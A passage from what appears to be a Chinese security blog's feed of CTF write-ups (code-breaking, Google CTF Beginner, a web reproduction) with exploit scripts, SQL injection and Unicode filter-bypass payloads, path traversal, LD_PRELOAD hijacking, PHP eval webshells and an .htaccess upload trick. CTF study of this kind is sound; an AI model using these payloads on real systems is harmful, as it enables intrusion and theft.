class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">static</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        <span class="keyword">return</span> ctx.redirect(ctx.router.url(<span class="string">'login'</span>))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> ctx.render(<span class="string">'admin'</span>, &#123;</span><br><span class="line">        <span class="string">'user'</span>: ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">await</span> send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>这里的关键点就是<code>safeKeyword</code>函数的过滤黑名单，干掉了union和select，这以为着注入时彻底没办法使用了。在下面的登录查询逻辑中有一个很明显的注入，输入的字符串直接拼接进查询。其实一开始思路是从<code>isString</code>和<code>match</code>中寻找绕过方法，但是没有什么相关trick。后来在参考fish师傅的wp中，提到了toUpperCase，其实想想这里有个大写转换确实很诡异，所以突破口应该是在这里。果然在ph师傅的之前的文章中有fuzz出来的特殊字符。</p><p><code>https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</code></p><p>这里面 <code>ı</code> 能变成大写的<code>I</code> ，<code>ſ</code> 会变成大写的<code>S</code> ，那么这样就能在正常的字符中插入特殊字符绕过<code>safeKeyword</code>的检测。再加上我们知道flag存放在flags表中，user表的结构也是知道的，所以直接用union注入查flag的值。</p><p><code>&#39; unıon ſelect 1,flag,3 from flags where &#39;1&#39;=&#39;1</code></p><p>为了要闭合单引号，必须要凑个where语句。最终在登录界面拿到flag。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><code>https://lorexxar.cn/2018/12/07/codingbreak-wp/</code></p><p><code>https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</code></p><p><code>https://www.cnblogs.com/iamstudy/articles/code_breaking_writeup.html</code></p><p><code>http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</code></p><p><code>http://rui0.cn/archives/1015</code></p><p><code>https://blog.l0ca1.xyz/Code-Breaking</code></p><p><code>https://blog.csdn.net/fnmsd/article/details/84556522</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ph师傅的代码审计CTF题目 &lt;code&gt;https://code-breaking.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;easy-function&quot;&gt;&lt;a href=&quot;#easy-function&quot; class=&quot;headerlink&quot; title=&quot;easy 
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part2</title>
    <link href="https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/"/>
    <id>https://hurricane618.me/2018/08/15/google-ctf-beginner-part2/</id>
    <published>2018-08-14T16:47:21.000Z</published>
    <updated>2018-08-14T16:47:22.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Holey-Beep-PWN"><a href="#Holey-Beep-PWN" class="headerlink" title="Holey Beep(PWN)"></a>Holey Beep(PWN)</h2><p>Holey Beep是CVE-2018-0492，详细的漏洞细节 <a href="https://sigint.sh/#/holeybeep" target="_blank" rel="noopener">https://sigint.sh/#/holeybeep</a> 。一开始以为要用这个的exp，结果一看给的二进制文件，似乎不太对……我们需要得到<code>/secret_cake_recipe</code>的内容，然而权限不够，所以这里应该是拿来越权的。</p><img src="/2018/08/15/google-ctf-beginner-part2/1.png"><p>我们看到第一个if是一个通过信号触发的条件，第二个if知道了程序需要参数，然后会open一个写死的路径，之后将输入的参数代入<code>ioctl(device,0x4B2F,参数)</code>，出现问题就会打印报错信息，然后关闭打开的文件。循环上面的操作把所有的参数都跑一遍。</p><p>信号触发的if会执行额外的一段函数。</p><img src="/2018/08/15/google-ctf-beginner-part2/2.png"><p>这里if成功的话就会打印错误信息，读取open的文件输出出来。这里应该是重点，有读写操作。</p><p>如果我们读的文件是<code>/secret_cake_recipe</code>那么只要触发signal以及满足if判断就可以拿到数据。这里可以用<code>ln -s</code>软链接生成<code>dev/console</code>，然后我们执行该程序同时发送SIGTERM信号就可以越权拿到数据。这里需要注意的是我们要让程序延长运行时间才行，如果运行时间不足，还没接收到信号就结束了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack,pack</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"fridge-todo-list.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"whz\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"2\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"read?"</span>)</span><br><span class="line">r.send(<span class="string">"-6\n"</span>)</span><br><span class="line">res = r.readuntil(<span class="string">"Hi whz,"</span>).splitlines()[<span class="number">0</span>]</span><br><span class="line">write_addr = res.split(<span class="string">':'</span>, <span class="number">1</span>)[<span class="number">1</span>][<span class="number">1</span>:].ljust(<span class="number">8</span>,chr(<span class="number">0</span>))</span><br><span class="line">write_addr = unpack(<span class="string">"&lt;Q"</span>, write_addr)[<span class="number">0</span>]</span><br><span class="line">base_addr = write_addr - <span class="number">0x910</span></span><br><span class="line">system_addr = base_addr + <span class="number">0x940</span></span><br><span class="line">r.readuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.send(<span class="string">"3\n"</span>)</span><br><span class="line">r.readuntil(<span class="string">"entry?"</span>)</span><br><span class="line">r.send(<span class="string">"-4\n"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">8</span> + pack(<span class="string">"&lt;Q"</span>, system_addr) + <span class="string">"\n"</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '#!/bin/bash' &gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'mkdir dev' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'ln -s /secret_cake_recipe dev/console' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '/home/user/holey_beep &#123;1..4096&#125; &amp;' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo 'pkill holey_beep -SIGTERM' &gt;&gt; pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"chmod +x pwn.sh\n"</span>)</span><br><span class="line">r.send(<span class="string">"./pwn.sh\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>这里需要多试几次来触发条件竞争，最后拿到flag</p><img src="/2018/08/15/google-ctf-beginner-part2/3.png"><h2 id="Admin-UI-PWN-RE"><a href="#Admin-UI-PWN-RE" class="headerlink" title="Admin UI(PWN+RE)"></a>Admin UI(PWN+RE)</h2><p>看了题目的介绍，再加上这个补丁信息，知道了有路径穿越漏洞。而一看提供的功能中只有第二个选项有读的操作，然后试了一下<code>../../../../../../../../../../../etc/passwd</code>，果然读到了passwd文件。</p><img src="/2018/08/15/google-ctf-beginner-part2/4.png"><p>那么剩下来的就只是寻找要读的文件了。</p><p>通过使用<code>../../../../../../proc/self/cmdline</code>得到运行程序的命令行参数。</p><img src="/2018/08/15/google-ctf-beginner-part2/5.png"><p>得到运行程序的命名，需要猜路径，猜到了<code>../main</code>，把读取到的二进制文件保存下来 <code>printf &quot;2\n../main\n3\n&quot; | nc mngmnt-iface.ctfcompetition.com 1337 &gt; output.bin</code></p><p>再通过16进制编辑器把多余的目录删掉，这样就得到了服务器上的二进制文件。</p><p>浏览代码，在验证登录的过程中打开了<code>flag</code>文件，然后比较输入。这样目标就很明确了，直接读<code>../flag</code>就可以拿到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/6.png"><h2 id="Admin-UI-2-PWN-RE"><a href="#Admin-UI-2-PWN-RE" class="headerlink" title="Admin UI 2(PWN+RE)"></a>Admin UI 2(PWN+RE)</h2><p>继续上一题的程序分析第二个密码</p><img src="/2018/08/15/google-ctf-beginner-part2/7.png"><p>可以看到这里对我们的输入异或之后会得到flag数组中的赋值，我们可以得到flag数组的值，只要再次异或回去即可得到密码。</p><img src="/2018/08/15/google-ctf-beginner-part2/8.png"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e_string = [<span class="number">0x84</span>, <span class="number">0x93</span>, <span class="number">0x81</span>, <span class="number">0xbc</span>, <span class="number">0x93</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0x98</span>, <span class="number">0x97</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0x94</span>, <span class="number">0xb0</span>, <span class="number">0xa8</span>, <span class="number">0xb5</span>, <span class="number">0x83</span>, <span class="number">0xbd</span>, <span class="number">0x98</span>, <span class="number">0x85</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb3</span>, <span class="number">0xa2</span>, <span class="number">0xb5</span>, <span class="number">0x98</span>, <span class="number">0xb3</span>, <span class="number">0xaf</span>, <span class="number">0xf3</span>, <span class="number">0xa9</span>, <span class="number">0x98</span>, <span class="number">0xf6</span>, <span class="number">0x98</span>, <span class="number">0xac</span>, <span class="number">0xf8</span>, <span class="number">0xba</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> e_string:</span><br><span class="line">    s ^= <span class="number">0xc7</span></span><br><span class="line">    flag += chr(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/9.png"><h2 id="Admin-UI-3-PWN-RE"><a href="#Admin-UI-3-PWN-RE" class="headerlink" title="Admin UI 3(PWN+RE)"></a>Admin UI 3(PWN+RE)</h2><p>这里有两个漏洞点，第一个是格式化字符串漏洞，第二个是栈溢出漏洞，我这里是使用的是栈溢出漏洞。</p><img src="/2018/08/15/google-ctf-beginner-part2/10.png"><p>看到缓冲区的位置离bp寄存器有0x30的距离。</p><img src="/2018/08/15/google-ctf-beginner-part2/11.png"><p>又因为是64位程序，所以再加上8个字节的RBP，最后加上我们的geishell函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'mngmnt-iface.ctfcompetition.com'</span>,<span class="number">1337</span>)</span><br><span class="line">shell_add = <span class="number">0x41414349</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">"1\n\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"CTF&#123;I_luv_buggy_sOFtware&#125;\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">35</span>+<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Authenticated"</span>)</span><br><span class="line">r.send(<span class="string">"A"</span>*<span class="number">0x38</span> + p64(shell_add))</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.send(<span class="string">"quit\n"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/12.png"><h2 id="Firmware-RE"><a href="#Firmware-RE" class="headerlink" title="Firmware(RE)"></a>Firmware(RE)</h2><p>虽然标签写的是RE但是……，做完的感觉就是一个MISC。</p><p>首先拿到一个zip文件，解压之后是一个gz压缩包，再次解压得到ext4的文件，搜索之后得知是一个Linux的文件系统。直接挂载之，<code>mount -t ext4 challenge2.ext4 /mnt</code>，需要root权限。挂载之后寻找线索，找了一圈在根目录下有个隐藏压缩文件<code>.mediapc_backdoor_password.gz</code>，解压cat一下，得到flag。</p><img src="/2018/08/15/google-ctf-beginner-part2/13.png"><h2 id="Gatekeepker-RE"><a href="#Gatekeepker-RE" class="headerlink" title="Gatekeepker(RE)"></a>Gatekeepker(RE)</h2><p>一个简单的字符串逆序程序，有两个参数，第二个参数会被逆序，然后和<code>zLl1ks_d4m_T0g_I</code>比较，这样就简单了，直接逆转回来就好。</p><img src="/2018/08/15/google-ctf-beginner-part2/14.png"><img src="/2018/08/15/google-ctf-beginner-part2/15.png"><h2 id="Media-DB-MISC"><a href="#Media-DB-MISC" class="headerlink" title="Media-DB(MISC)"></a>Media-DB(MISC)</h2><p>给了一个python文件，大概的功能是能记录歌手和歌曲的一个简易控制台，要我们获取oauth_token。在输入点中过滤了单引号，而且输入点只有一个没有办法使用\来转义单引号逃逸字符串，所以这里只能寻找其他思路来突破。</p><img src="/2018/08/15/google-ctf-beginner-part2/16.png"><p>观察到这里有一个从数据库随机读歌手的操作，再加上之前的操作单引号，双引号过滤不一致。</p><img src="/2018/08/15/google-ctf-beginner-part2/17.png"><p>那么这里的不一致性就会造成二阶注入，我们可以在过滤双引号的输入点中注入带有单引号的数据，然后在随机读歌手的时候单引号会被代入SQL语句中造成SQL注入。</p><p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p><p>这里顺带一提不能使用#注释符，因为#符号在python中也是注释符会破坏语法。</p><img src="/2018/08/15/google-ctf-beginner-part2/18.png"><h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>给了C的源代码，主要操作就是设置环境变量，代码中过滤了一些常见的环境变量。</p><img src="/2018/08/15/google-ctf-beginner-part2/19.png"><p>问题出在这个过滤只执行一次，所以我们重复设置环境变量就可以了。这里是利用LD_PRELOAD劫持函数，执行我们编译的函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc load.c -o load -shared -fPIC</code>生成动态链接文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/20.png"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了一些PWN方面的知识还是不错的，丰富知识面。就是想吐槽这个题目的标签，很多都是挂羊头卖狗肉。</p><img src="/2018/08/15/google-ctf-beginner-part2/21.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Holey-Beep-PWN&quot;&gt;&lt;a href=&quot;#Holey-Beep-PWN&quot; class=&quot;headerlink&quot; title=&quot;Holey Beep(PWN)&quot;&gt;&lt;/a&gt;Holey Beep(PWN)&lt;/h2&gt;&lt;p&gt;Holey Beep是CVE-2018-
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客CTF 部分Web复现</title>
    <link href="https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/"/>
    <id>https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/</id>
    <published>2018-08-01T05:17:19.000Z</published>
    <updated>2018-08-01T05:23:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>复现了三道题，其他的都关环境了，记录一下复现的这三道吧。</p><h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p>在网上找到的onethink的漏洞分析文章</p><p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p><p>这个是原理相同的，只不过是thinkphp</p><p><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p><p>通过这些我们知道，问题是出在缓存的存储上，我们的用户名被简单的反序列化存储进了缓存文件中。所以要getshell的话我们只需要通过用户名传入webshell。但是这里有个条件，我们必须能猜到缓存文件的名字。</p><p>在题目的根目录下扫到 www.zip 得到题目的源码，在这里我们看到filename的命名规律，以及目录。推测这里的源码和线上是一样的，所以条件满足。</p><img src="/2018/08/01/dianfengjikeCTF-web/1.png"><p>我们在本地测试的时候，删除 Application/Install/Data/install.lock 文件，然后通过install.php安装，随后通过在本地生成缓存文件来预测题目的缓存文件，最后代码执行拿flag。</p><p>由于用户名有长度限制，所以分两次注册。第一次<code>%0a%0d$x=$_GET[x];\\</code>，第二次<code>%0a%0deval($x);\\</code></p><p>注册之后必须要登录一下，这样就把webshell写入了缓存文件中了。</p><img src="/2018/08/01/dianfengjikeCTF-web/2.png"><p>之后在题目中重复步骤，就可以拿到webshell，执行代码搜索flag</p><img src="/2018/08/01/dianfengjikeCTF-web/3.png"><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>这道题一开始想法是通过收集信息社工得到flag……，先是看到<a href="mailto:BabyWeb@my.lol" target="_blank" rel="noopener">BabyWeb@my.lol</a>，然后访问my.lol可以得到一个qq邮箱，结果这个qq没什么东西，思路就断在这里了。</p><p>参考了其他人的writeup，发现要通过这些信息猜测后台，爆破密码……像这种信息量较少的题目，都会有一些扫目录，扫端口，收集子域名之类的操作。</p><p>输入<a href="http://106.75.2.4/babyweb" target="_blank" rel="noopener">http://106.75.2.4/babyweb</a> ，自动跳转到<a href="http://106.75.2.4/babyweb/login.php" target="_blank" rel="noopener">http://106.75.2.4/babyweb/login.php</a> ，看了一个writeup有的队伍能直接根据收集的信息爆破出用户名和密码。。。这操作太强了，我是搞不出来，所以就按照常规操作扫端口。</p><img src="/2018/08/01/dianfengjikeCTF-web/4.png"><p>根据扫出来的结果可以看到开放了3306端口，使用hydra爆破之。这个我在一开始的时候爆破的是root用户，结果看提示已经改成另外的用户了……哭唧唧，最后是在writeup的帮助下知道了用户名为babyweb，这个可以通过网站的信息推测出来。</p><p>拿到密码之后，连接数据库。</p><img src="/2018/08/01/dianfengjikeCTF-web/5.png"><p>然而并没有某writeup中所说的用户名密码，可能被删了，所以这里就只能直接用writeup中的用户名密码登后台了。</p><p>后台有个简单的文件上传，然后后缀有限制只能是图片后缀，这里上传之后没有路径，但是我们有数据库的数据，根据数据库中的数据我们可以得到上传后文件的文件名再加上img路径就可以知道文件的路径。再看看上传的类型中还有htaccesss，这里就是文件上传的漏洞利用。</p><p>通过上传htaccess文件来让一些后缀得到解析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>最后上传.abc为后缀的webshell即可</p><img src="/2018/08/01/dianfengjikeCTF-web/6.png"><h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>网站使用metinfo模板，在网上搜索一番，看到了几个SQl注入的洞，试了试都不行，索性放弃，看writeup。</p><p>扫描目录扫出file/file.php，能删除文件，然后没有对..过滤导致可以跨目录删除文件…… emmmm 看来是为了比赛额外添加了一个文件删除，这个如果字典没扫出来就根本无法下手了。</p><p>删除文件的路径中有对<code>./</code>的过滤，所以最后删除的路径为<code>...//xxxx/xxx</code><br>扫到这个之后，在之前的metinfo漏洞里面有讲删除install.lock文件，导致重装的问题，再加上metinfo对数据库参数过滤不严的问题，只要数据库配置参数中任意一项填入一句话木马<code>#*/@eval($_REQUEST[xxx]);/*</code>，就可以成功getshell。</p><img src="/2018/08/01/dianfengjikeCTF-web/7.png"><p>虽然安装步骤没有走完，但是只要数据库创建成功，就可以通过config/config_db.php拿shell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://url.cn/5HWdbfS" target="_blank" rel="noopener">http://url.cn/5HWdbfS</a></p><p><a href="https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg</a></p><p><a href="https://xz.aliyun.com/t/2469" target="_blank" rel="noopener">https://xz.aliyun.com/t/2469</a></p><p><a href="https://www.safeinfo.me/ldgb/75.html" target="_blank" rel="noopener">https://www.safeinfo.me/ldgb/75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;复现了三道题，其他的都关环境了，记录一下复现的这三道吧。&lt;/p&gt;
&lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part1</title>
    <link href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/"/>
    <id>https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</id>
    <published>2018-07-18T15:03:09.000Z</published>
    <updated>2018-07-19T01:16:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>会陆陆续续的把GoogleCTF题目的相关复现整理出来，这里先放一部分。通过这次Beginner训练还是了解到了许多之前没接触过的，比如PWN题中的libc地址问题。</p><h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>原理说出来都很简单，考察的是PDF中表层的覆盖其实还是可读的，所以我们选中需要的内容复制粘贴出来就可以了</p><img src="/2018/07/18/google-ctf-beginner-part1/1.png"><p>复制粘贴大法</p><img src="/2018/07/18/google-ctf-beginner-part1/2.png"><h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>一道题考察图片转文字之后，运用古典加密解决问题。学到新的知识OCR，PDF或者图片转文本的技术。</p><p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">在线转换链接</a></p><img src="/2018/07/18/google-ctf-beginner-part1/3.png"><p>之后在凯撒加密中破解，因为题目中包含着凯撒，提示也是很明显了。</p><img src="/2018/07/18/google-ctf-beginner-part1/4.png"><h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>考察了一个细节点，当我们处于man手册的状态下可以使用 !command 的方式来执行命令</p><img src="/2018/07/18/google-ctf-beginner-part1/5.png"><p>我们就直接ls出home目录下有东西，然后cat出来即可。</p><h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>给了一个图标文件，看了文本内容没什么东西，然后开始用binwalk分析一下</p><img src="/2018/07/18/google-ctf-beginner-part1/6.png"><p>果然里面有东西，改成zip解压出来就ok了</p><img src="/2018/07/18/google-ctf-beginner-part1/7.png"><h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>在上一道题目中留下了一个 <code>www.com</code> 文件，com后缀查了一下是MS-DOS的执行文件，所以现在的windows系统是无法执行的，DOSBOX启动！</p><p>直接运行就出现一个毫无意义的话，没有什么结果之后把二进制文件转成文本看看其中的内容，也没有什么收获……</p><p>经过其他人的Writeup之后得知要调试这个程序，在调试中发现，它会对其中的某个段取出字符异或然后重写回去，这样就好办了，一直跟踪调试，每次经过一些重写操作之后看看内存中的数据。最后得到flag。</p><img src="/2018/07/18/google-ctf-beginner-part1/8.png"><h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By 